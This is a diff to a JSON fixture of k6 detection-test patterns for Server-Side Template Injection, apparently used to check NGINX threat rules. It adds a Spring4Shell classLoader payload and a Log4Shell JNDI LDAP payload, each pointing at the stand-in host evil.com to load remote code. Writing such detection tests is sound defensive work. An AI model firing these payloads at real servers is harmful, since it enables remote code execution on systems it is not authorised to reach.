@@ -1,7 +1,7 @@
 {
   "metadata": {
     "category": "ssti",
-    "total_patterns": 25,
+    "total_patterns": 27,
     "port": 80,
     "description": "k6 test patterns for Server-Side Template Injection attacks",
     "phase": "Phase 10 Stage 1",
@@ -322,6 +322,30 @@
       "severity": "critical",
       "expected_rule": "[NGINX Emerging Threat] Spring4Shell attack",
       "description": "Phase 10: FreeMarker protectionDomain access (matches Spring4Shell rule)"
+    },
+    {
+      "id": "SSTI_SPRING_001",
+      "name": "Spring4Shell classLoader manipulation",
+      "category": "ssti",
+      "subcategory": "spring4shell",
+      "payload": "class.module.classLoader.URLs[0]=jar:http://evil.com",
+      "encoded": "class.module.classLoader.URLs%5B0%5D%3Djar%3Ahttp%3A%2F%2Fevil.com",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX Emerging Threat] Spring4Shell attack"
+    },
+    {
+      "id": "SSTI_LOG4S_001",
+      "name": "Log4Shell JNDI LDAP injection",
+      "category": "ssti",
+      "subcategory": "log4shell",
+      "payload": "${jndi:ldap://evil.com/exploit}",
+      "encoded": "%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fexploit%7D",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX Emerging Threat] Log4Shell attack"
     }
   ]
 }
